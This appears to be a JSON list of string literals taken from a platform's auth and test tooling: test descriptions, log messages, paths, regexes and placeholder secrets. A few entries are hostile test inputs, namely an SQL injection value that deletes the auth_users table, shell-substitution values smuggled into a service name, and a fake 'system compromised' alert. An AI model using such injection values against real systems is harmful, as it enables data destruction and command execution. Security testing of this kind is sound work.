    "Token Blacklisting Basic Tests - Business Impact\n\nSecurity Foundation: Token Revocation and Access Control\n- Ensures proper token revocation for logout and security incidents\n- Validates blacklisting prevents continued access with revoked tokens\n- Critical foundation for account security and administrative controls\n\nTechnical Excellence:\n- Token revocation: individual tokens can be invalidated immediately\n- User blacklisting: all user tokens invalidated for account suspension\n- Persistence validation: blacklists survive service restarts (critical security requirement)\n- Malformed token handling: robust error handling prevents service disruption\n- Token rotation security: blacklisted refresh tokens cannot generate new access tokens\n- Concurrent safety: thread-safe blacklist operations for production scalability\n\nPlatform Security:\n- Foundation: Secure token revocation foundation for logout and security operations\n- Security: Comprehensive blacklist validation prevents access with revoked credentials\n- Persistence: Critical security requirement that blacklists survive system restarts\n- Reliability: Robust handling of edge cases and malformed inputs\n- Performance: Thread-safe operations ensure reliable blacklist checking under load",
    "Token Blacklisting Basic Tests - Core security functionality for token revocation\n\nTests the basic token blacklisting functionality that is critical for security,\nespecially for logout, account suspension, and security incidents.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Security | Goal: Auth Security | Impact: Token Revocation\n- Ensures proper token revocation for logout and security incidents\n- Validates blacklisting prevents continued access with revoked tokens\n- Critical foundation for account security and administrative controls\n\nTest Coverage:\n- Token blacklisting on logout operations\n- User blacklisting for account suspension\n- Blacklist persistence across service restarts\n- Blacklist validation during token verification",
    "Token Endpoint",
    "Token Test Data Factory\nCreates JWT tokens and OAuth tokens for auth service testing.\nSupports access tokens, refresh tokens, and service tokens with proper claims.",
    "Token Validation",
    "Token exchange timeout",
    "Token failed for reason other than expiration:",
    "Token generation took",
    "Token is expired:",
    "Token issued exactly 24 hours ago should be rejected",
    "Token issued just under 24 hours ago should be accepted",
    "Token missing required security claims (jti, iss, aud) should be rejected",
    "Token service temporarily limited",
    "Token should be blacklisted",
    "Token should be detected as blacklisted",
    "Token should be valid before blacklisting",
    "Token should not be blacklisted initially",
    "Token storage correctly failed due to database issue:",
    "Token validation correctly failed:",
    "Token validation failed:",
    "Token validation succeeded despite 'netra_dev' database not existing. This indicates improper error handling or graceful degradation.",
    "Token validation test failed:",
    "Token with correct issuer should validate",
    "Token with incorrect issuer should be rejected",
    "Token with invalid JSON payload should return None",
    "TokenFactory",
    "TokenTestUtils",
    "Tokens generated with 'test-secret':",
    "Too many requests",
    "ToolDispatcher(llm_manager)",
    "ToolPermissionMiddleware does not default to staging",
    "Top splitting strategy:",
    "Top violations by type:",
    "Total Categories:",
    "Total Duration:",
    "Total Fake Tests Found:",
    "Total Files Scanned:",
    "Total Iterations:",
    "Total Test Files:",
    "Total Test Violations:",
    "Total Tests Analyzed:",
    "Total Tests:",
    "Total Tracked Tests:",
    "Total Violations:",
    "Total changes made:",
    "Total conftest.py files:",
    "Total errors:",
    "Total failures found:",
    "Total files processed:",
    "Total files scanned:",
    "Total fixes applied:",
    "Total iterations:",
    "Total lines:",
    "Total mocks found:",
    "Total test files scanned:",
    "Total test files:",
    "Total tests processed:",
    "Total tests scanned:",
    "Total validation time:",
    "Total violations:",
    "Total workflows:",
    "Total:",
    "Tuple[",
    "Type:",
    "UNIFIED TEST CONFIGURATION\n==========================\nCentral configuration for all testing operations across Netra platform.\nThis module defines test levels, markers, environments, and execution strategies.",
    "UNION",
    "URGENT: Add tests for",
    "URL Construction",
    "URL Driver Compatibility",
    "URL Generation with Actual Credentials",
    "URL compatibility issues:",
    "URL construction test failed:",
    "URL format mismatch. Expected:",
    "URL format mismatches:",
    "URL format validation failed:",
    "URL missing asyncpg driver specification",
    "URL must contain correct Cloud SQL connection name",
    "URL:",
    "USE_DOCKER_SERVICES",
    "USE_MOCKS",
    "USE_REAL_LLM",
    "USE_REAL_SERVICES",
    "USE_TEST_DATABASE",
    "UTF-8",
    "Unauthorized client",
    "Unexpected error during security validation:",
    "Unexpected error during testing:",
    "Unexpected error for missing GOOGLE_CLIENT_ID:",
    "Unexpected error for missing GOOGLE_CLIENT_SECRET:",
    "Unexpected error from AuthSecretLoader.",
    "Unexpected error:",
    "Unexpected exception from AuthSecretLoader.",
    "Unexpected response from",
    "Unexpected response from OAuth callback:",
    "Unexpected status code:",
    "Unexpected status:",
    "Unified JWT Validation Tests Package\n\nBusiness Value: Authentication security for cross-service communication",
    "Unified Test Runner for Netra Apex Platform",
    "Unit Tests",
    "Unit tests for OAuth models and validation\nTests Pydantic models used in OAuth flows",
    "Unit tests for isolated components",
    "Unix socket path doesn't exist in Cloud Run environment",
    "Unjustified mocks by category:",
    "Unjustified mocks:",
    "Unknown",
    "Unknown Variable Access env",
    "Unknown category:",
    "Unknown error",
    "Unknown role:",
    "Unknown test type:",
    "Unsupported OAuth provider:",
    "Update Jest snapshots",
    "Update optimization models based on execution results",
    "Updated configurations:",
    "Updated references in:",
    "Updated test discovery configuration",
    "Updated test runner configuration",
    "Updated test to use",
    "Updating optimization models with execution data",
    "Upstream service responding slowly",
    "Usage:",
    "Usage: python standardize_l3_test_names.py [options]",
    "Use Docker services instead of local processes",
    "Use auth_service.auth_core.database.connection.auth_db directly",
    "Use auth_service.auth_core.database.connection.auth_db.initialize() directly",
    "Use deployment pipeline for real migrations",
    "Use development Google OAuth Client ID",
    "Use development Google OAuth Client Secret",
    "Use production Google OAuth Client ID",
    "Use production Google OAuth Client Secret",
    "Use pytest fixtures to reduce test function length:\n\n@pytest.fixture\ndef authenticated_user():\n    user_data = {\"email\": \"test@example.com\", \"password\": \"password\"}\n    user = create_user(user_data)\n    token = authenticate_user(user.email, user_data[\"password\"])\n    return user, token\n\ndef test_user_can_access_profile(authenticated_user):\n    user, token = authenticated_user\n    profile = get_user_profile(user.id, token)\n    assert profile[\"email\"] == user.email",
    "Use pytest.mark.parametrize to reduce function length:\n\n@pytest.mark.parametrize(\"email,password,expected\", [\n    (\"valid@email.com\", \"strong_password\", True),\n    (\"invalid-email\", \"password\", False),\n    (\"valid@email.com\", \"weak\", False),\n])\ndef test_user_validation(email, password, expected):\n    result = validate_user_data({\"email\": email, \"password\": password})\n    assert result == expected",
    "Use real LLM instead of mocks",
    "Use real backend services (Docker or local) for frontend tests",
    "Use real components or move mocks to shared test utilities",
    "Use staging Google OAuth Client ID",
    "Use staging Google OAuth Client Secret",
    "Use test isolation for concurrent execution",
    "User",
    "User Test Data Factory\nCreates test users with consistent data patterns for auth service testing.\nSupports both local and OAuth users with proper password handling.",
    "User authentication bypassed when database is down",
    "User denied access",
    "User info fetch timeout",
    "User info timeout",
    "User management components not yet implemented",
    "User not found",
    "User should be blacklisted",
    "User should be detected as blacklisted",
    "User should not be blacklisted initially",
    "User should not be blacklisted yet",
    "User token from auth service should validate in main backend",
    "User with email",
    "User's access token should be blacklisted",
    "User's refresh token should be blacklisted",
    "User-Agent",
    "User.",
    "User:",
    "User: [cyan]",
    "UserFactory",
    "UserFlowTestBase",
    "Uses deprecated unittest patterns",
    "Uses hardcoded sleep",
    "Uses postgres:// instead of postgresql+asyncpg://",
    "Using :memory: database - automatic isolation",
    "Using URL:",
    "Using fallback execution method",
    "Using persistent database - consider cleanup logic if needed",
    "VALIDATION ERROR:",
    "VALIDATION MISMATCH!",
    "VERIFIED FUNCTIONALITY:",
    "VIOLATION EXAMPLES FOR FIXES:",
    "VIOLATION TYPE BREAKDOWN:",
    "VIOLATION: conftest.py files found in non-service-level directories:",
    "VIOLATIONS:",
    "Valid",
    "Valid Cloud SQL configuration",
    "Valid ID token should be accepted",
    "Valid staging credentials should not cause connection failure:",
    "Valid state should pass validation",
    "Valid test token:",
    "Valid:",
    "Validate OAuth callback endpoints exist and respond",
    "Validate OAuth config consistency across environments",
    "Validate config matches Google OAuth Console",
    "Validate redirect URIs point to auth service",
    "Validate splitting suggestion",
    "Validate test structure and configuration",
    "Validating JWT Environment Configuration:",
    "Validating:",
    "Validation Edge Cases",
    "Validation Issues Found:",
    "Validation Test",
    "Validation correct",
    "Validation error:",
    "Validation failed with exception:",
    "Validation for",
    "Value",
    "Variable",
    "Verbose output",
    "Verification summary saved to: workflow_verification_results.md",
    "Verify GitHub workflow status",
    "Verify all dependencies are preserved",
    "Verify all functions are included in the split",
    "Verify database connection using canonical auth_db",
    "Verify help text displays correctly",
    "Verifying staging is configured to use Google Secret Manager only...",
    "Very low success rate (",
    "Very short timeout",
    "VeryLongPasswordThatExceedsTypicalLimits123456789!@#$%^&*()",
    "Violations (",
    "Violations found:",
    "Violations:",
    "Vulnerability scanner '",
    "WARNING",
    "WARNING:",
    "WARNING: Auto-fix capabilities are DANGEROUS and disabled by default!",
    "WARNING: Expected valid URL to pass validation",
    "WARNING: Fix the issues above before deploying to staging.",
    "WARNING: Found",
    "WARNING: Found naming conflicts in",
    "WARNING: New file",
    "WARNING: Socket path does not exist:",
    "WEBSOCKET DEV MODE FUNCTIONAL TEST REPORT",
    "WEBSOCKET_URL",
    "WS_BASE_URL",
    "Wait for all services to be healthy.",
    "Waiting for Docker services to be healthy...",
    "Waiting for services to be ready...",
    "Warning: Categories not found:",
    "Warning: Could not load .env.test file:",
    "Warning: File not found:",
    "Warning: Known failing file not found:",
    "Warning: Resume category '",
    "Warning: python-dotenv not installed, using default test environment",
    "Warnings:",
    "Weak OAUTH_HMAC_SECRET not detected: '",
    "WebSocket",
    "WebSocket Connection",
    "WebSocket URL not found",
    "WebSocket auth endpoint missing, got:",
    "WebSocket auth failed:",
    "WebSocket auth properly rejected invalid token - GOOD!",
    "WebSocket closed unexpectedly:",
    "WebSocket config endpoint test PASSED",
    "WebSocket connected successfully",
    "WebSocket connection successful",
    "WebSocket health endpoint test PASSED",
    "WebSocket implementation is working correctly in DEV MODE!",
    "WebSocket test failed:",
    "WebSocket-related tests",
    "Worker Utilization:",
    "Workflow Status Verification Script - Corrected Test Suite",
    "Workload Simulator\n\nThis module generates realistic workload patterns with seasonality and business logic.",
    "Workload optimized. Performance improved by 25%.",
    "WorkloadSimulator",
    "Would add to",
    "Would split",
    "WrongPassword123!",
    "X-Attack-Type",
    "X-Forwarded-For",
    "X-HTTP-Method-Override",
    "X-Method-Override",
    "X-RateLimit-Limit",
    "X-RateLimit-Remaining",
    "X-RateLimit-Reset",
    "X-Scanner",
    "X-Service-Name",
    "YES",
    "YES I UNDERSTAND THE RISKS",
    "Z",
    "ZmVybmV0LXRlc3Qta2V5LXBsYWNlaG9sZGVyLTEyMw==",
    "[",
    "[!] Action Required: Fix violations to improve test quality",
    "[+] CORS validation implemented",
    "[+] Configuration and health endpoints working",
    "[+] Connection management working",
    "[+] JWT authentication enforced",
    "[+] Message processing implemented",
    "[+] Resource cleanup functioning",
    "[+] Secure WebSocket endpoints registered",
    "[/cyan]",
    "[/green]",
    "[/red]",
    "[AUTO-FIX] Applying automatic improvements...",
    "[CONTENT] Contains '",
    "[COVERAGE] Analyzing test coverage...",
    "[CRITICAL]",
    "[CRITICAL] Configuration Status:",
    "[CRITICAL] Majority of test files violate limits. Consider systematic refactoring.",
    "[CRITICAL] SYSTEM COMPROMISED - ADMIN ACCESS GRANTED",
    "[Coverage] Coverage Report: reports/coverage/html/index.html",
    "[Coverage] Total Coverage:",
    "[DEBUG] Full error details:",
    "[DEBUG] Running command for",
    "[DIR]",
    "[DRY RUN] Would rename to:",
    "[ERROR]",
    "[ERROR] Auth database connection failed",
    "[ERROR] Auth database test failed:",
    "[ERROR] Backend database connection failed",
    "[ERROR] Backend database test failed:",
    "[ERROR] Command:",
    "[ERROR] Configuration loading failed:",
    "[ERROR] Error:",
    "[ERROR] Failed",
    "[ERROR] Failed to run",
    "[ERROR] Failed to run frontend tests:",
    "[ERROR] Failed to run tests:",
    "[ERROR] Fake security alert",
    "[ERROR] File not found:",
    "[ERROR] Frontend tests timed out after 30 seconds",
    "[ERROR] Iteration",
    "[ERROR] Missing",
    "[ERROR] PostgreSQL not available:",
    "[ERROR] Scanning",
    "[ERROR] Too short",
    "[FAILED]",
    "[FAILED] STAGING STARTUP TESTS FAILED",
    "[FAILURE] Some tests failed. Please check the errors above.",
    "[FAIL]",
    "[FAIL] Backend startup tests failed",
    "[FAIL] Build failed.",
    "[FAIL] CHECKS FAILED with exit code",
    "[FAIL] DataSubAgent test failed:",
    "[FAIL] E2E tests failed",
    "[FAIL] Enhanced registry test failed:",
    "[FAIL] Failed:",
    "[FAIL] Frontend startup tests failed",
    "[FAIL] InitializationManager test failed:",
    "[FAIL] Iteration",
    "[FAIL] Linting failed. Use --fix to auto-fix issues.",
    "[FAIL] TEST FAILED:",
    "[FAIL] TESTS FAILED with exit code",
    "[FAIL] Tests failed",
    "[FAIL] Tests failed. Found",
    "[FAIL] Type checking failed.",
    "[FAIL] UNEXPECTED ERROR:",
    "[FAIL] WebSocket Connection:",
    "[FIXED]",
    "[FIXED] Fixed and verified",
    "[GAPS] Identifying test gaps...",
    "[GOOD] Most test files comply. Address remaining violations.",
    "[INFO] Cloud SQL connector not installed (optional for local dev):",
    "[INFO] Environment Variables:",
    "[INFO] No ENVIRONMENT set, using test values for local testing",
    "[INFO] No frontend tests found - passing",
    "[INFO] No token replacements needed in",
    "[INFO] Running frontend tests:",
    "[INFO] Running full staging test suite...",
    "[INFO] Running quick staging health checks...",
    "[INFO] Running standard staging tests...",
    "[INFO] To run frontend tests, install dependencies with: cd frontend && npm install",
    "[INTERRUPTED] Test run cancelled by user",
    "[LIVE MODE - Testing real connections]",
    "[MAJOR]",
    "[MINOR]",
    "[MISSING]",
    "[OK]",
    "[OK] All dependencies resolved",
    "[OK] All project tests comply with real test requirements!",
    "[OK] All required configuration loaded",
    "[OK] All secrets accessible",
    "[OK] All test files are compliant!",
    "[OK] All tests comply with real test requirements!",
    "[OK] Async test configuration already updated",
    "[OK] Auth database connection closed",
    "[OK] Auth database connection successful",
    "[OK] Auth database initialized",
    "[OK] Auth database status:",
    "[OK] Backend database connection closed",
    "[OK] Backend database connection successful",
    "[OK] Backend database initialized",
    "[OK] Backend database status:",
    "[OK] Backend startup tests passed (",
    "[OK] Cloud SQL connector is available",
    "[OK] Connected to database:",
    "[OK] E2E tests passed (",
    "[OK] Exit code:",
    "[OK] Fixed",
    "[OK] Frontend startup tests passed (",
    "[OK] Good",
    "[OK] Health endpoints configured",
    "[OK] No changes needed:",
    "[OK] No size violations found!",
    "[OK] PostgreSQL is running on localhost:",
    "[OK] PostgreSQL version:",
    "[OK] Service initialization order correct",
    "[OK] Set",
    "[OK] Startup completed in",
    "[OK] Working",
    "[OUTPUT]",
    "[OUTPUT] Output:",
    "[PASSED]",
    "[PASS]",
    "[PASS] ALL ENVIRONMENT DETECTION TESTS PASSED!",
    "[PASS] ALL TESTS PASSED in",
    "[PASS] Agent created:",
    "[PASS] Agent retrieved:",
    "[PASS] All",
    "[PASS] All OAuth config tests passed!",
    "[PASS] All auth client environment detection tests passed!",
    "[PASS] All middleware environment default tests passed!",
    "[PASS] All schema default tests passed!",
    "[PASS] Already passing",
    "[PASS] Correctly defaults to STAGING when no env vars",
    "[PASS] Correctly defaults to staging for ambiguous service name",
    "[PASS] Correctly detects production when explicitly specified",
    "[PASS] Correctly detects staging from ENVIRONMENT var",
    "[PASS] Correctly detects staging from K_SERVICE",
    "[PASS] Execution context created:",
    "[PASS] Factory compliance defaults to staging",
    "[PASS] Factory status integration defaults to staging",
    "[PASS] Fallback mode:",
    "[PASS] Fallback result:",
    "[PASS] Fallback used:",
    "[PASS] Health status:",
    "[PASS] Individual agent registration:",
    "[PASS] Initialization result:",
    "[PASS] Initialization time:",
    "[PASS] Iteration",
    "[PASS] OAuth config correctly configured for staging",
    "[PASS] Passed:",
    "[PASS] PermissionRequest schema defaults to staging",
    "[PASS] Registry created",
    "[PASS] Registry health:",
    "[PASS] Tests passed!",
    "[PASS] Tests passed! (Run",
    "[PASS] ToolPermissionMiddleware defaults to staging",
    "[PASS] WebSocket Connection: Connected",
    "[QUALITY] Assessing test quality...",
    "[REAL E2E] TESTS WITH ACTUAL LLM/SERVICES",
    "[RECOMMEND] Generating improvement recommendations...",
    "[REPORT] Detailed report saved to:",
    "[RESULT] Exit code:",
    "[REVIEW] Running Autonomous Test Review in",
    "[Report] HTML Report: reports/tests/report.html",
    "[SETUP] Environment variables set:",
    "[SETUP] Setting staging environment variables...",
    "[SIMULATE] Checking configuration...",
    "[SIMULATE] Checking dependencies...",
    "[SIMULATE] Checking health endpoints...",
    "[SIMULATE] Checking initialization order...",
    "[SIMULATE] Checking secrets...",
    "[SIMULATE] Startup time: 12s (limit:",
    "[SIMULATION MODE - Not connecting to real services]",
    "[SKIPPED]",
    "[SKIP]",
    "[SKIP] Cannot auto-fix:",
    "[STATUS]",
    "[SUCCESS] ALL CHECKS PASSED",
    "[SUCCESS] All configuration checks completed",
    "[SUCCESS] All tests passed! Async PostgreSQL configuration is working.",
    "[SUCCESS] All tests passed! Staging deployment is healthy.",
    "[SUCCESS] Applied",
    "[SUCCESS] Basic unit tests are passing!",
    "[SUCCESS] Configuration loaded successfully!",
    "[SUCCESS] Environment detection is properly configured!",
    "[SUCCESS] STAGING STARTUP TESTS PASSED",
    "[SUCCESS] Staging configuration test completed",
    "[TEST]",
    "[TEST] Running test:",
    "[TEST] Testing API Endpoints...",
    "[TEST] Testing Authentication Flow...",
    "[TEST] Testing Service Health Endpoints...",
    "[TEST] Testing WebSocket Connectivity...",
    "[TIMEOUT] Frontend tests timed out",
    "[TIMEOUT] Iteration",
    "[TIMEOUT] Skipping remaining tests in",
    "[TIMEOUT] Test execution timed out",
    "[TIMEOUT] Test timed out",
    "[ULTRA-THINK] Performing deep semantic analysis...",
    "[WARNING] Backend server is not running. Starting it...",
    "[WARNING] ClickHouse tests require running ClickHouse instance - these are integration tests",
    "[WARNING] Frontend dev server is not running. Starting it...",
    "[WARNING] Significant test limit violations. Prioritize cleanup.",
    "[WARNING] Some tests failed. Check the report for details.",
    "[WARNING] Some tests still failing - check individual test output above",
    "[WARNING] Test file not found:",
    "[WARNING] node_modules not found. Skipping frontend tests.",
    "[WARNING] npm not available. Skipping frontend tests.",
    "[WARN] Added function but test still fails",
    "[X]",
    "[X] FILES EXCEEDING 300 LINES (",
    "[X] FILES WITH FUNCTIONS > 8 LINES (",
    "[X] FILES WITH MOCK COMPONENTS (",
    "[^:]*:)",
    "[bold blue]Starting Local OAuth Testing[/bold blue]",
    "[bold cyan]1. Checking Environment Configuration[/bold cyan]",
    "[bold cyan]2. Checking Service Health[/bold cyan]",
    "[bold cyan]3. Testing OAuth Config Endpoint[/bold cyan]",
    "[bold cyan]4. Testing OAuth Login Initiation[/bold cyan]",
    "[bold cyan]5. Testing Token Generation[/bold cyan]",
    "[bold cyan]6. Testing Token Validation[/bold cyan]",
    "[bold cyan]‚ïê‚ïê‚ïê OAuth Local Test Report ‚ïê‚ïê‚ïê[/bold cyan]",
    "[bold green]üìã Recommendations:[/bold green]",
    "[bold]Auth URL:[/bold]",
    "[bold]Client ID:[/bold]",
    "[bold]Provider:[/bold]",
    "[green]‚úì Results exported to",
    "[green]‚úì[/green]",
    "[green]‚úì[/green] All tests passed! OAuth is properly configured.",
    "[green]‚úì[/green] Config endpoint returned successfully",
    "[green]‚úì[/green] Correctly redirecting to auth service",
    "[green]‚úì[/green] Login endpoint redirects correctly",
    "[green]‚úì[/green] Token generated successfully",
    "[green]‚úì[/green] Token validated successfully",
    "[red]Error during testing:",
    "[red]‚úó[/red]",
    "[red]‚úó[/red] Config endpoint failed:",
    "[red]‚úó[/red] Dev login failed:",
    "[red]‚úó[/red] Error fetching config:",
    "[red]‚úó[/red] Error testing login flow:",
    "[red]‚úó[/red] Error testing token generation:",
    "[red]‚úó[/red] Error validating token:",
    "[red]‚úó[/red] Login endpoint didn't redirect:",
    "[red]‚úó[/red] No token in response",
    "[red]‚úó[/red] Token validation failed:",
    "[yellow]‚äò[/yellow]",
    "[yellow]‚ö†[/yellow] Dev login not enabled - skipping token generation test",
    "[yellow]‚ö†[/yellow] Unexpected redirect location",
    "\\",
    "\\.return_value\\s*=",
    "\\.side_effect\\s*=",
    "\\1\\n    \\2",
    "\\1def setup_method(self):\\n\\2\"\"\"Setup method for test class.\"\"\"\\n",
    "\\[\\s*[\"\\']Part 1[\"\\']\\s*,\\s*[\"\\']Part 2[\"\\']\\s*,\\s*[\"\\']Part 3[\"\\']\\s*\\]",
    "\\b(Mock|MagicMock|AsyncMock)\\(.*?\\)",
    "\\n\\n\\n+",
    "]",
    "] PID",
    "] Processing:",
    "^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$",
    "^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$",
    "^[a-zA-Z_]+:[a-zA-Z_]+$",
    "^\\s*(?:const|let|var)\\s+(\\w+)\\s*=\\s*(?:async\\s+)?(?:function|\\()",
    "^\\s*(?:export\\s+)?(?:async\\s+)?function\\s+(\\w+)",
    "^\\s*(?:it|test|describe)\\s*\\([\\'\"`]([^\\'\"`]+)",
    "^\\s*(\\w+)\\s*:\\s*(?:async\\s+)?(?:function|\\()",
    "^\\s*(async\\s+)?def\\s+\\w+",
    "^from \\. import",
    "^from \\.\\. import",
    "^from helpers\\.",
    "_",
    "__",
    "__file__",
    "__func__",
    "__init__",
    "__init__.py",
    "__main__",
    "__pycache__",
    "__tests__",
    "__tests__/auth",
    "__tests__/components",
    "__tests__/hooks",
    "__tests__/integration",
    "__tests__/integration/critical-integration.test.tsx",
    "__tests__/lib",
    "__tests__/services",
    "__tests__/services/webSocketService.test.ts",
    "__tests__/store",
    "__tests__/system/startup.test.tsx",
    "__tests__/utils",
    "_assertions() - Common assertions",
    "_basic(self):\n        \"\"\"Test basic functionality of",
    "_comprehensive",
    "_convert_sslmode_to_ssl",
    "_core.py",
    "_critical",
    "_current_file_path",
    "_determine_urls()",
    "_determine_urls()[0] + \"/auth/callback\"",
    "_determine_urls()[0] +\"/auth/callback\"",
    "_determine_urls()[0]+ \"/auth/callback\"",
    "_determine_urls()[0]+\"/auth/callback\"",
    "_determine_urls()[1]",
    "_determine_urls()[1] + \"/auth/callback\"",
    "_determine_urls()[1] +\"/auth/callback\"",
    "_determine_urls()[1]+ \"/auth/callback\"",
    "_determine_urls()[1]+\"/auth/callback\"",
    "_e2e.py",
    "_edge_cases(self):\n        \"\"\"Test edge cases for",
    "_error_handling(self):\n        \"\"\"Test error handling in",
    "_expired",
    "_extended.py",
    "_feature1.py",
    "_feature2.py",
    "_fixtures.py",
    "_functions.py",
    "_future",
    "_helper",
    "_helper_",
    "_helpers.py",
    "_initialized",
    "_integration.py",
    "_integration_",
    "_l3",
    "_l3.py",
    "_latency_avg",
    "_latency_p95",
    "_load_from_secret_manager",
    "_part",
    "_part_",
    "_password",
    "_real",
    "_scenario_1() - First test case",
    "_scenario_2() - Second test case",
    "_setup() - Test setup logic",
    "_test",
    "_test.py",
    "_test_",
    "_tests",
    "_unit.py",
    "_user",
    "_user_",
    "_utilities.py",
    "_utils.py",
    "_wrong_issuer",
    "`",
    "` (similarity:",
    "` ‚Üî `",
    "```",
    "`hostname`",
    "a",
    "abc",
    "abc123",
    "abcdefghijklmnop",
    "abstractmethod",
    "access",
    "access-control-allow-methods",
    "access-control-allow-origin",
    "access_",
    "access_denied",
    "access_token",
    "access_token_123",
    "account_locked",
    "account_unlocked",
    "accounts.google.com",
    "accounts.google.com/o/oauth2/v2/auth",
    "across",
    "act",
    "act-event-",
    "action",
    "active",
    "actual_pass",
    "actual_response",
    "actual_value",
    "add",
    "add_function",
    "admin",
    "admin'; DELETE FROM auth_users; --",
    "admin:delete_users",
    "admin:read_users",
    "admin:update_users",
    "admin@netra.ai",
    "admin_operation",
    "administrative",
    "affected_services",
    "after",
    "agent",
    "agent_completed",
    "agent_orchestration",
    "agent_started",
    "agents",
    "agents/test_example_prompts_e2e_real.py",
    "agent|supervisor|executor|chain",
    "aggressive",
    "ai",
    "alembic",
    "alembic.command.upgrade",
    "alembic.ini",
    "alembic/alembic.ini",
    "alerts",
    "alg",
    "alignment_report.json",
    "all",
    "all_passed",
    "allergy_season",
    "allow",
    "allow_prod",
    "already exists in",
    "already used",
    "also_invalid!@#",
    "alternative",
    "alternative_actions",
    "alternative_methods",
    "analysis",
    "analytics",
    "analytics|metrics|dashboard|reporting",
    "analyze",
    "and",
    "anonymous",
    "anthropic",
    "api",
    "api_base",
    "api_documentation",
    "api_key",
    "api_routes",
    "api_url",
    "app",
    "app.",
    "app.config",
    "app.core.secret_manager",
    "app.main:app",
    "app.staging.netrasystems.ai",
    "app/",
    "app/auth",
    "app/core",
    "app/db",
    "app/llm",
    "app/middleware/tool_permission_middleware.py",
    "app/pytest.ini",
    "app/routes/factory_compliance.py",
    "app/schemas/ToolPermission.py",
    "app/services/factory_status/factory_status_integration.py",
    "app/tests",
    "app/tests/**/*.py",
    "app/tests/agents",
    "app/tests/core",
    "app/tests/core/test_config_manager.py",
    "app/tests/core/test_config_manager.py::TestConfigManager::test_initialization",
    "app/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error",
    "app/tests/e2e",
    "app/tests/integration",
    "app/tests/models",
    "app/tests/performance",
    "app/tests/routes",
    "app/tests/routes/test_health_route.py",
    "app/tests/services",
    "app/tests/services/agents/test_sub_agent.py::test_agent_node_is_coroutine",
    "app/tests/services/agents/test_supervisor_service.py::test_supervisor_end_to_end",
    "app/tests/services/agents/test_tools.py",
    "app/tests/services/apex_optimizer_agent/test_tool_builder.py",
    "app/tests/services/database",
    "app/tests/services/test_security_service.py",
    "app/tests/test_agent_service_critical.py",
    "app/tests/test_api_endpoints_critical.py",
    "app/tests/unit",
    "app/tests/utils",
    "app/tests/websocket",
    "app/websocket",
    "application/json",
    "applied",
    "archive",
    "are critical/high severity - immediate action required",
    "args",
    "args_kwargs_stub",
    "args_kwargs_stubs",
    "assert",
    "assert \\\\1",
    "assert \\\\1 != \\\\2",
    "assert \\\\1 == \\\\2",
    "assert \\\\1 is None",
    "assert \\\\1 is not None",
    "assert not \\\\1",
    "assertion",
    "assertion_similarity",
    "async",
    "async def",
    "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$",
    "async\\s+def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$",
    "async\\s+def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{",
    "asyncio",
    "asyncpg",
    "asyncpg.connect",
    "at line",
    "attack_vector",
    "attempt_number",
    "attr",
    "aud",
    "audit_logging",
    "auth",
    "auth failure",
    "auth-\t-service",
    "auth-$(echo hello",
    "auth-${USER",
    "auth-container-abc123",
    "auth-instance-001",
    "auth-service",
    "auth-service-secret-12345678901234567890",
    "auth-service-staging",
    "auth-svc",
    "auth.",
    "auth.staging",
    "auth.staging.netrasystems.ai",
    "authUrl",
    "auth_",
    "auth_audit_logs",
    "auth_code_",
    "auth_conftest",
    "auth_core",
    "auth_provider",
    "auth_routes.py",
    "auth_routes.py not found for code analysis",
    "auth_secret_456",
    "auth_service",
    "auth_service.auth_core.core.session_manager.SessionManager.create_session",
    "auth_service.auth_core.core.session_manager.auth_redis_manager",
    "auth_service.auth_core.database.connection.auth_db.get_session",
    "auth_service.auth_core.database.connection.auth_db.initialize",
    "auth_service.auth_core.database.connection.auth_db.is_ready",
    "auth_service.auth_core.database.connection_events.logger",
    "auth_service.auth_core.database.connection_events.setup_auth_async_engine_events",
    "auth_service.auth_core.database.database_manager.AuthDatabaseManager.create_async_engine",
    "auth_service.auth_core.database.database_manager.create_async_engine",
    "auth_service.auth_core.database.models.Base.metadata.create_all",
    "auth_service.auth_core.redis_manager.auth_redis_manager",
    "auth_service.auth_core.routes.auth_routes.AuthConfig.get_google_client_id",
    "auth_service.auth_core.routes.auth_routes.AuthConfig.get_google_client_secret",
    "auth_service.auth_core.routes.auth_routes.auth_service",
    "auth_service.auth_core.routes.auth_routes.httpx.AsyncClient.get",
    "auth_service.auth_core.routes.auth_routes.httpx.AsyncClient.post",
    "auth_service.auth_core.routes.auth_routes.logger",
    "auth_service.auth_core.routes.auth_routes.oauth_security",
    "auth_service.auth_core.secret_loader",
    "auth_service.auth_core.security.oauth_security.OAuthSecurityManager.validate_state_parameter",
    "auth_service.auth_core.security.oauth_security.auth_redis_manager",
    "auth_service.auth_core.security.oauth_security.datetime",
    "auth_service.auth_core.security.oauth_security.hashlib.sha256",
    "auth_service.auth_core.security.oauth_security.logger",
    "auth_service.main",
    "auth_service.main:app",
    "auth_service/app",
    "auth_service/pytest.ini",
    "auth_service/tests",
    "auth_service/tests/conftest.py",
    "auth_service_health",
    "auth_service_test",
    "auth_service_url",
    "auth_services",
    "auth_service|AuthService",
    "auth_sessions",
    "auth_success",
    "auth_url",
    "auth_users",
    "auth_users should exist",
    "auth_users table should exist",
    "auth_users table should exist after table creation",
    "authenticate_user",
    "authentication",
    "authentication failed",
    "authentication_flow",
    "authorized_redirect_uris",
    "auth|login|jwt|session|token",
    "auto",
    "automated",
    "automatic fixes",
    "availability",
    "available_urls",
    "avatar_url",
    "average",
    "average_estimated_duration",
    "average_rps",
    "average_success_rate",
    "average_value_score",
    "avg_complexity",
    "avg_error_rate",
    "avg_latency_p50_ms",
    "avg_latency_p95_ms",
    "avg_tokens_per_request",
    "await",
    "back_to_school",
    "backend",
    "backend-authentication-integration-failures.py",
    "backend-service",
    "backend-service-secret-12345678901234567890",
    "backend-staging-pr-123",
    "backend-svc",
    "backend_health",
    "backend_secret_123",
    "backend_url",
    "background_tasks",
    "backup_files",
    "bad_test",
    "bad_tests",
    "bad_tests.json",
    "balanced",
    "base",
    "base_rps",
    "basic",
    "basic_health_info",
    "batch_fix_results_",
    "bearer",
    "bearer.invalid.token",
    "benchmark",
